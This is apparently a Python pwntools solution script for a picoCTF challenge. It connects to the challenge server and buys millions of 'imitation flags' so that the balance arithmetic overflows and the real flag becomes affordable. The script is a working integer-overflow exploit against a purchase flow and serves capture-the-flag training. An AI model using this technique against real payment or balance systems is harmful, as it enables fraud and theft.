from pwn import *

r = remote("jupiter.challenges.picoctf.org", 44566)

MENU_BALANCE = "1"
MENU_BUY = "2"
MENU_EXIT = "3"

FLAG_IMITATION = "1"
FLAG_REAL = "2"

BUY_REAL_FLAG = "1"

def menu(choice):
    r.sendlineafter("Enter a menu selection\n", str(choice))

def check_balance():
    menu(MENU_BALANCE)
    print r.recvregex("Balance: \d+ \n").strip()

def buy_imitation_flag(amount):
    menu(MENU_BUY)
    log.info("Attempting to buy {} imitation flags".format(amount))
    r.sendlineafter("2. 1337 Flag\n", FLAG_IMITATION)
    r.sendlineafter("These knockoff Flags cost 900 each, enter desired quantity", str(amount))
    print r.recvregex("Your current balance after transaction: \d+\n").strip()

def buy_real_flag():
    menu(MENU_BUY)
    log.info("Attempting to buy a real flag")
    r.sendlineafter("2. 1337 Flag\n", FLAG_REAL)
    r.sendlineafter("Enter 1 to buy one", BUY_REAL_FLAG)
    line = r.recvline()
    print line
    if "FLAG" not in line:
        print r.recvline()

def exit():
    menu(MENU_EXIT)

check_balance()
buy_imitation_flag(3333333)
buy_real_flag()
exit()